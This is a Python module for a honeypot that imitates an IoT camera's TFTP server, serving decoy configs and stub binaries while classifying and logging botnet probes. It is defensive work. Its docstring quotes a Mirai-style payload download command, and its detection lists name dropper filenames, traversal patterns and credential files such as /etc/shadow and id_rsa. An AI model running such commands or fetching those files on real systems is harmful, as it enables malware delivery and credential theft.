#!/usr/bin/env python3
"""
honeyPot — TFTP Service (RFC 1350 + RFC 2347 options)
Emulates a TFTP server on an IoT/camera device (UDP port 69).

Protocol overview (RFC 1350):
  - Client sends RRQ (read) or WRQ (write) to port 69
  - Server opens a NEW ephemeral UDP socket (Transfer ID / TID) to handle
    the full transfer — each transfer lives on its own port pair
  - Data exchanged in up to 512-byte blocks with block-level ACKs
  - Transfer ends when server sends a block < 512 bytes (for RRQ)
    or client sends a block < 512 bytes (for WRQ)

Why this matters:
  - Mirai botnet uses TFTP to deliver architecture-specific binaries after
    initial Telnet/SSH compromise:  tftp -g -r mips 1.2.3.4
  - Satori, Gafgyt, Tsunami, and derivatives all follow the same pattern
  - Router and camera firmware can be overwritten via WRQ
  - Config exfiltration (startup-config, running-config) is common

Key design rule: this module never calls settimeout() on the shared UDP
server socket at port 69.  The datagram has already been read by _start_udp
in honeypot.py and is passed in as the `data` parameter.  All per-transfer
work runs in a separate thread on an ephemeral socket.
"""

import datetime
import random
import re
import socket
import struct
import threading

# ─── TFTP Opcodes (RFC 1350) ──────────────────────────────────────────────────

OP_RRQ   = 1   # Read Request
OP_WRQ   = 2   # Write Request
OP_DATA  = 3   # Data
OP_ACK   = 4   # Acknowledgement
OP_ERROR = 5   # Error
OP_OACK  = 6   # Option Acknowledgement (RFC 2347)

# TFTP Error codes
ERR_UNDEFINED   = 0
ERR_NOT_FOUND   = 1
ERR_ACCESS      = 2
ERR_DISK_FULL   = 3
ERR_ILLEGAL_OP  = 4
ERR_UNKNOWN_TID = 5
ERR_FILE_EXISTS = 6
ERR_NO_USER     = 7

BLOCK_SIZE  = 512     # bytes per DATA block (RFC 1350 default)
MAX_BLOCKS  = 64      # cap per transfer so we don't store huge uploads
TIMEOUT     = 5.0     # seconds to wait for next client packet

# ─── Attack pattern data ──────────────────────────────────────────────────────

# Filenames used by Mirai / Satori / Gafgyt to download architecture payloads
_MIRAI_FILENAMES = {
    "mips", "mipsel", "mpsl", "arm", "arm5", "arm6", "arm7", "arm64",
    "x86", "x86_64", "i586", "i686", "m68k", "ppc", "sh4", "sparc",
    "arc", "rv32", "rv64", "s390x", "loongarch64",
    # explicit bot names
    "bot", "mirai", "satori", "gafgyt", "bashlite", "tsunami",
    "mozi", "muhstik", "sora", "okiru",
    # shell-based dropper scripts
    "bot.sh", "payload", "payload.sh", "exploit", "shell.sh",
    "tftp.sh", "get.sh", "download.sh", "update", "install.sh",
    # obfuscated names seen in the wild
    ".nttpd", ".nttpd.1", ".nttpd.2", "a", "b", "c", "i",
}

# Sensitive filenames that deserve a honeytoken alert when accessed
_SENSITIVE_FILES = {
    "/etc/passwd",           "etc/passwd",
    "/etc/shadow",           "etc/shadow",
    "/etc/config/passwd",    "etc/config/passwd",
    "/mnt/mtd/Config/account.ini", "account.ini",
    "startup-config",        "running-config",
    "backup.cfg",            "config.dat",     "config.bin",
    "/root/.ssh/id_rsa",     "id_rsa",
    "/var/www/.env",         ".env",
    "wp-config.php",         "/etc/hosts",
}

# WRQ filenames used for firmware-overwrite attacks
_FIRMWARE_FILENAMES = {
    "firmware.bin", "firmware.img", "update.bin", "update.img",
    "image.bin", "flash.bin", "rootfs.bin", "rootfs.img",
    "openwrt.bin", "ddwrt.bin", "upgrade.bin",
}

# Directory traversal indicators
_TRAVERSAL_PATTERNS = re.compile(r"\.\./|\.\.\\|%2e%2e|%252e")

# ─── Fake file content ────────────────────────────────────────────────────────

# Fake config files served for RRQ so attackers get "real" data
_FAKE_FILES: dict[str, bytes] = {
    "startup-config": (
        b"!\n"
        b"hostname DS-2CD2043G2-I\n"
        b"!\n"
        b"username admin privilege 15 secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0\n"
        b"username operator privilege 7 secret 5 $1$xYzA$K9mP2rQtXlV8nUwO1sD3e.\n"
        b"!\n"
        b"interface GigabitEthernet0/0\n"
        b" ip address 192.168.1.108 255.255.255.0\n"
        b" no shutdown\n"
        b"!\n"
        b"ip default-gateway 192.168.1.1\n"
        b"!\n"
        b"end\n"
    ),
    "running-config": (
        b"Building configuration...\n\n"
        b"Current configuration : 1024 bytes\n"
        b"!\n"
        b"hostname DS-2CD2043G2-I\n"
        b"username admin privilege 15 secret 0 Admin@2024\n"
        b"!\n"
        b"ntp server 192.168.1.1\n"
        b"!\n"
        b"end\n"
    ),
    "account.ini": (
        b"[users]\n"
        b"admin=Admin@2024\n"
        b"operator=Operator123\n"
        b"guest=\n"
        b"[settings]\n"
        b"lockout_threshold=5\n"
        b"session_timeout=300\n"
    ),
    "backup.cfg": (
        b"<?xml version='1.0' encoding='utf-8'?>\n"
        b"<BackupConfig version='2.0'>\n"
        b"<DeviceInfo><model>DS-2CD2043G2-I</model>"
        b"<serial>DS-2CD2043G2-I20230313CCCH012345678</serial></DeviceInfo>\n"
        b"<UserList>\n"
        b"<User><name>admin</name><password>Admin@2024</password>"
        b"<level>Administrator</level></User>\n"
        b"</UserList>\n"
        b"</BackupConfig>\n"
    ),
}

# Fake ELF binary stubs served for architecture downloads.
# ELF magic + MIPS big-endian header, followed by zero padding.
# Realistic enough to fool a scanner but useless as code.
def _fake_elf(arch: str) -> bytes:
    """
    Return a fake ELF stub for the named architecture.
    Size is intentionally NOT a multiple of BLOCK_SIZE (512) so the TFTP
    client receives a short final block and knows the transfer is complete.
    """
    elf_class   = 1          # 32-bit
    endian      = 2          # big-endian
    machine     = 0x0008     # MIPS

    arch_lower = arch.lower()
    if "arm" in arch_lower:
        endian, machine = 1, 0x0028   # ARM LE
    elif "x86" in arch_lower or "i68" in arch_lower or "i58" in arch_lower:
        endian, machine = 1, 0x0003   # x86 LE
    elif "ppc" in arch_lower:
        endian, machine = 2, 0x0014   # PowerPC BE
    elif "sh4" in arch_lower:
        endian, machine = 1, 0x002A   # SH LE
    elif "sparc" in arch_lower:
        endian, machine = 2, 0x0002   # SPARC BE

    header = (
        b"\x7fELF"
        + bytes([elf_class, endian, 1, 0])  # class, data, version, OS/ABI
        + b"\x00" * 8                        # padding
        + struct.pack(">HH", 2, machine)     # e_type=EXEC, e_machine
        + b"\x00" * 491                      # total = 511 bytes — one short of
    )                                         # blksize so client sees EOF cleanly
    return header


# ─── Packet builders ──────────────────────────────────────────────────────────

def _pkt_ack(block: int) -> bytes:
    return struct.pack("!HH", OP_ACK, block)


def _pkt_data(block: int, data: bytes) -> bytes:
    return struct.pack("!HH", OP_DATA, block) + data


def _pkt_error(code: int, msg: str) -> bytes:
    return struct.pack("!HH", OP_ERROR, code) + msg.encode() + b"\x00"


def _pkt_oack(options: dict) -> bytes:
    """Option ACK — RFC 2347."""
    body = b""
    for k, v in options.items():
        body += k.encode() + b"\x00" + str(v).encode() + b"\x00"
    return struct.pack("!H", OP_OACK) + body


# ─── Packet parser ────────────────────────────────────────────────────────────

class TFTPPacket:
    """Minimal TFTP packet parser."""

    def __init__(self):
        self.opcode   = 0
        self.filename = ""
        self.mode     = ""
        self.options  = {}   # RFC 2347 options (blksize, tsize, timeout)
        self.block    = 0
        self.data     = b""
        self.errcode  = 0
        self.errmsg   = ""
        self.valid    = False

    @classmethod
    def parse(cls, raw: bytes) -> "TFTPPacket":
        pkt = cls()
        if len(raw) < 2:
            return pkt
        try:
            pkt.opcode = struct.unpack("!H", raw[:2])[0]

            if pkt.opcode in (OP_RRQ, OP_WRQ):
                # Format: opcode(2) + filename\0 + mode\0 [+ opt\0 val\0 ...]
                parts = raw[2:].split(b"\x00")
                parts = [p.decode("latin-1") for p in parts if p]
                if parts:
                    pkt.filename = parts[0]
                if len(parts) > 1:
                    pkt.mode = parts[1].lower()
                # RFC 2347 options come in (name, value) pairs after mode
                for i in range(2, len(parts) - 1, 2):
                    pkt.options[parts[i].lower()] = parts[i + 1]
                pkt.valid = True

            elif pkt.opcode == OP_DATA:
                if len(raw) >= 4:
                    pkt.block = struct.unpack("!H", raw[2:4])[0]
                    pkt.data  = raw[4:]
                    pkt.valid = True

            elif pkt.opcode == OP_ACK:
                if len(raw) >= 4:
                    pkt.block = struct.unpack("!H", raw[2:4])[0]
                    pkt.valid = True

            elif pkt.opcode == OP_ERROR:
                if len(raw) >= 4:
                    pkt.errcode = struct.unpack("!H", raw[2:4])[0]
                    pkt.errmsg  = raw[4:].rstrip(b"\x00").decode("latin-1", errors="ignore")
                    pkt.valid   = True

        except Exception:
            pass
        return pkt


# ─── Threat classification ────────────────────────────────────────────────────

def _classify(opcode: int, filename: str, raw: bytes) -> tuple[str, str, bool]:
    """
    Returns (attack_type, threat_level, is_honeytoken).
    """
    fn   = filename.lower().lstrip("/").strip()
    base = fn.split("/")[-1]

    # Directory traversal
    if _TRAVERSAL_PATTERNS.search(filename):
        return "tftp_path_traversal", "critical", False

    # Mirai / botnet payload download
    if base in _MIRAI_FILENAMES or fn in _MIRAI_FILENAMES:
        if opcode == OP_RRQ:
            return "tftp_malware_download", "critical", False
        return "tftp_malware_upload", "critical", False

    # Firmware overwrite
    if base in _FIRMWARE_FILENAMES or fn in _FIRMWARE_FILENAMES:
        if opcode == OP_WRQ:
            return "tftp_firmware_overwrite", "critical", False
        return "tftp_firmware_read", "high", False

    # Sensitive / honeytoken files
    if fn in _SENSITIVE_FILES or base in _SENSITIVE_FILES:
        return "tftp_honeytoken", "critical", True

    # Generic read/write
    if opcode == OP_RRQ:
        return "tftp_read_request", "medium", False
    if opcode == OP_WRQ:
        return "tftp_write_request", "high", False

    return "tftp_probe", "low", False


# ─── Per-transfer worker ──────────────────────────────────────────────────────

def _serve_rrq(
    tid_sock:   socket.socket,
    client_addr: tuple,
    filename:   str,
    mode:       str,
    options:    dict,
    log_attack,
    geoip_func,
    intel_fields_func,
    new_ip_alert,
    inc_counter,
    attack_type: str,
    threat_level: str,
    is_honeytoken: bool,
    gdata: dict,
):
    """
    Handle a Read Request (RRQ) transfer.
    Serves fake file content to the client and logs each exchange.
    """
    ip, port = client_addr
    intel    = intel_fields_func(gdata) if intel_fields_func else {}

    # Choose content to serve
    fn_lower = filename.lower().lstrip("/").strip()
    base     = fn_lower.split("/")[-1]

    content: bytes
    if base in _FAKE_FILES:
        content = _FAKE_FILES[base]
    elif base in _MIRAI_FILENAMES:
        content = _fake_elf(base)
    else:
        # Generic: serve a small plausible text response
        content = (
            f"# {filename}\n"
            f"# Hikvision DS-2CD2043G2-I — V5.7.15 build 230313\n"
        ).encode()

    # Negotiate blksize if client requested it (RFC 2347)
    blksize  = int(options.get("blksize", BLOCK_SIZE))
    blksize  = max(8, min(blksize, 65464))

    if options:
        oack_opts = {"blksize": blksize}
        if "tsize" in options:
            oack_opts["tsize"] = len(content)
        try:
            tid_sock.sendto(_pkt_oack(oack_opts), client_addr)
            # Wait for ACK 0 for the OACK
            tid_sock.settimeout(TIMEOUT)
            raw, _ = tid_sock.recvfrom(1024)
            pkt = TFTPPacket.parse(raw)
            if pkt.opcode == OP_ERROR:
                return
        except Exception:
            return

    # Send file in blocks, wait for ACK each time.
    # RFC 1350 §6: when file size is an exact multiple of blksize we MUST send
    # a zero-length final DATA block so the client knows the transfer is done.
    blocks_sent  = 0
    offset       = 0
    block_num    = 0
    last_chunk   = b"\x01"   # sentinel — non-empty so the loop starts

    while True:
        chunk      = content[offset: offset + blksize]
        offset    += blksize
        block_num += 1
        is_last    = len(chunk) < blksize   # short block → definitely last

        pkt_data = _pkt_data(block_num, chunk)
        retries  = 0
        while retries < 3:
            try:
                tid_sock.sendto(pkt_data, client_addr)
                tid_sock.settimeout(TIMEOUT)
                raw, _ = tid_sock.recvfrom(1024)
                ack = TFTPPacket.parse(raw)
                if ack.opcode == OP_ERROR:
                    return
                if ack.opcode == OP_ACK and ack.block == block_num:
                    blocks_sent += 1
                    break
            except socket.timeout:
                retries += 1
            except Exception:
                return

        if is_last:
            break   # short (or empty) block was the last one

        # If the last block was exactly blksize, send an empty block for EOF
        if offset >= len(content):
            block_num += 1
            try:
                tid_sock.sendto(_pkt_data(block_num, b""), client_addr)
                tid_sock.settimeout(TIMEOUT)
                tid_sock.recvfrom(1024)   # consume the final ACK
            except Exception:
                pass
            break

    if log_attack:
        try:
            log_attack({
                "timestamp":    _ts(), "source_ip":   ip,
                "source_port":  port,  "dest_port":   69,
                "service":      "tftp", "protocol":   "UDP",
                "method":       "RRQ",
                "path":         filename[:500],
                "payload":      f"served {blocks_sent} blocks ({len(content)} bytes)",
                "attack_type":  attack_type,
                "threat_level": threat_level,
                "honeytoken":   filename if is_honeytoken else "",
                "country":      gdata.get("country", "Unknown"),
                "city":         gdata.get("city", ""),
                "latitude":     gdata.get("latitude", 0.0),
                "longitude":    gdata.get("longitude", 0.0),
                **intel,
            })
        except Exception:
            pass

    if new_ip_alert:
        try:
            new_ip_alert(ip, gdata.get("country", "Unknown"),
                         gdata.get("city", ""), "tftp")
        except Exception:
            pass


def _serve_wrq(
    tid_sock:    socket.socket,
    client_addr: tuple,
    filename:    str,
    mode:        str,
    options:     dict,
    log_attack,
    geoip_func,
    intel_fields_func,
    new_ip_alert,
    inc_counter,
    attack_type:  str,
    threat_level: str,
    is_honeytoken: bool,
    gdata: dict,
):
    """
    Handle a Write Request (WRQ) transfer.
    Accepts and logs the uploaded payload — attackers sometimes upload
    malware or replacement firmware directly to the device.
    """
    ip, port = client_addr
    intel    = intel_fields_func(gdata) if intel_fields_func else {}

    blksize = int(options.get("blksize", BLOCK_SIZE))
    blksize = max(8, min(blksize, 65464))

    # Option negotiation
    if options:
        oack_opts = {"blksize": blksize}
        try:
            tid_sock.sendto(_pkt_oack(oack_opts), client_addr)
        except Exception:
            return
    else:
        # Send ACK 0 to initiate transfer
        try:
            tid_sock.sendto(_pkt_ack(0), client_addr)
        except Exception:
            return

    received_blocks = 0
    total_bytes     = 0
    payload_sample  = b""

    for _ in range(MAX_BLOCKS):
        try:
            tid_sock.settimeout(TIMEOUT)
            raw, src = tid_sock.recvfrom(blksize + 4 + 64)
        except socket.timeout:
            break
        except Exception:
            break

        pkt = TFTPPacket.parse(raw)
        if pkt.opcode == OP_ERROR:
            break

        if pkt.opcode != OP_DATA:
            continue

        received_blocks += 1
        total_bytes     += len(pkt.data)
        if len(payload_sample) < 512:
            payload_sample += pkt.data[: 512 - len(payload_sample)]

        # ACK each block
        try:
            tid_sock.sendto(_pkt_ack(pkt.block), client_addr)
        except Exception:
            break

        if len(pkt.data) < blksize:
            break  # final block

    if log_attack:
        try:
            log_attack({
                "timestamp":    _ts(), "source_ip":   ip,
                "source_port":  port,  "dest_port":   69,
                "service":      "tftp", "protocol":   "UDP",
                "method":       "WRQ",
                "path":         filename[:500],
                "payload":      payload_sample[:300].hex(),
                "raw_payload":  payload_sample[:256].hex(),
                "attack_type":  attack_type,
                "threat_level": threat_level,
                "honeytoken":   filename if is_honeytoken else "",
                "country":      gdata.get("country", "Unknown"),
                "city":         gdata.get("city", ""),
                "latitude":     gdata.get("latitude", 0.0),
                "longitude":    gdata.get("longitude", 0.0),
                **intel,
            })
        except Exception:
            pass

    if new_ip_alert:
        try:
            new_ip_alert(ip, gdata.get("country", "Unknown"),
                         gdata.get("city", ""), "tftp")
        except Exception:
            pass


def _transfer_worker(
    client_addr,
    pkt: TFTPPacket,
    log_attack,
    geoip_func,
    intel_fields_func,
    new_ip_alert,
    inc_counter,
    gdata: dict,
    attack_type: str,
    threat_level: str,
    is_honeytoken: bool,
):
    """
    Open an ephemeral UDP socket (the Transfer ID) and run the full
    TFTP data exchange with the client.
    """
    try:
        tid_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Bind to any available port on the same interface — this is the TID
        tid_sock.bind(("0.0.0.0", 0))
        tid_sock.settimeout(TIMEOUT)

        kwargs = dict(
            tid_sock       = tid_sock,
            client_addr    = client_addr,
            filename       = pkt.filename,
            mode           = pkt.mode,
            options        = pkt.options,
            log_attack     = log_attack,
            geoip_func     = geoip_func,
            intel_fields_func = intel_fields_func,
            new_ip_alert   = new_ip_alert,
            inc_counter    = inc_counter,
            attack_type    = attack_type,
            threat_level   = threat_level,
            is_honeytoken  = is_honeytoken,
            gdata          = gdata,
        )

        if pkt.opcode == OP_RRQ:
            _serve_rrq(**kwargs)
        else:
            _serve_wrq(**kwargs)

    except Exception:
        pass
    finally:
        try:
            tid_sock.close()
        except Exception:
            pass


# ─── Main entry point ─────────────────────────────────────────────────────────

def handle_tftp(
    srv_sock,
    addr,
    data:                  bytes,
    log_attack             = None,
    geoip_func             = None,
    intel_fields_func      = None,
    new_ip_alert           = None,
    check_honeytoken_file  = None,
    inc_counter            = None,
):
    """
    Handle a single TFTP datagram arriving at port 69.

    Parameters
    ----------
    srv_sock : socket.socket
        The shared UDP server socket (port 69).  We NEVER call recv on it
        here — the datagram is already in `data`.
    addr : (str, int)
        Sender (ip, port).
    data : bytes
        The raw datagram.
    """
    ip, port = addr

    gdata: dict = {}
    if geoip_func:
        try:
            gdata = geoip_func(ip) or {}
        except Exception:
            pass

    intel: dict = {}
    if intel_fields_func:
        try:
            intel = intel_fields_func(gdata) or {}
        except Exception:
            pass

    pkt = TFTPPacket.parse(data)

    # ── Malformed / unexpected opcode ──────────────────────────────────────────
    if not pkt.valid or pkt.opcode not in (OP_RRQ, OP_WRQ):
        if log_attack:
            try:
                log_attack({
                    "timestamp":    _ts(), "source_ip":  ip,
                    "source_port":  port,  "dest_port":  69,
                    "service":      "tftp", "protocol": "UDP",
                    "attack_type":  "tftp_malformed",
                    "threat_level": "low",
                    "payload":      data[:64].hex(),
                    "country":      gdata.get("country", "Unknown"),
                    "city":         gdata.get("city", ""),
                    "latitude":     gdata.get("latitude", 0.0),
                    "longitude":    gdata.get("longitude", 0.0),
                    **intel,
                })
            except Exception:
                pass
        # Send a polite TFTP error so port scanners see a "real" service
        try:
            srv_sock.sendto(_pkt_error(ERR_ILLEGAL_OP, "Illegal TFTP operation"), addr)
        except Exception:
            pass
        return

    filename   = pkt.filename
    opcode     = pkt.opcode
    attack_type, threat_level, is_honeytoken = _classify(opcode, filename, data)

    # ── Override is_honeytoken via injected checker if available ───────────────
    if check_honeytoken_file and not is_honeytoken:
        try:
            is_ht, _ = check_honeytoken_file(filename)
            if is_ht:
                is_honeytoken = True
                threat_level  = "critical"
                attack_type   = "tftp_honeytoken"
        except Exception:
            pass

    # ── Count honeytokens ──────────────────────────────────────────────────────
    if is_honeytoken and inc_counter:
        try:
            inc_counter("honeytokens")
        except Exception:
            pass

    # ── Log the initial request immediately (before transfer starts) ───────────
    method_str = "RRQ" if opcode == OP_RRQ else "WRQ"
    if log_attack:
        try:
            log_attack({
                "timestamp":    _ts(), "source_ip":  ip,
                "source_port":  port,  "dest_port":  69,
                "service":      "tftp", "protocol":  "UDP",
                "method":       method_str,
                "path":         filename[:500],
                "payload":      f"{method_str} {filename!r} mode={pkt.mode}",
                "attack_type":  attack_type,
                "threat_level": threat_level,
                "honeytoken":   filename if is_honeytoken else "",
                "country":      gdata.get("country", "Unknown"),
                "city":         gdata.get("city", ""),
                "latitude":     gdata.get("latitude", 0.0),
                "longitude":    gdata.get("longitude", 0.0),
                **intel,
            })
        except Exception:
            pass

    if new_ip_alert:
        try:
            new_ip_alert(ip, gdata.get("country", "Unknown"),
                         gdata.get("city", ""), "tftp")
        except Exception:
            pass

    # ── Spawn a per-transfer worker on its own ephemeral socket ───────────────
    threading.Thread(
        target  = _transfer_worker,
        args    = (
            addr, pkt,
            log_attack, geoip_func, intel_fields_func,
            new_ip_alert, inc_counter,
            gdata, attack_type, threat_level, is_honeytoken,
        ),
        daemon  = True,
        name    = f"tftp-tid-{ip}-{port}",
    ).start()


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _ts() -> str:
    return datetime.datetime.utcnow().isoformat()


def _log(log_attack, entry: dict):
    if log_attack is None:
        return
    try:
        log_attack(entry)
    except Exception:
        pass
